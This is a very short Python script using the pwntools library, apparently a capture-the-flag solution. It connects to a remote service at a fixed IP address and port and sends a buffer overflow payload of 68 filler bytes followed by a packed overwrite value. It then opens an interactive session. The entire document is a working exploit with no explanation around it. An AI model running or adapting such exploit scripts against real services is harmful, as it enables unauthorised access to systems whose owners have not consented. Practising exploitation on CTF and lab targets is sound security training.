from pwn import *
io = remote('130.85.56.42', 4000)

payload = b'T'*68 + p32(0x64656164)
io.sendline(payload)
io.interactive()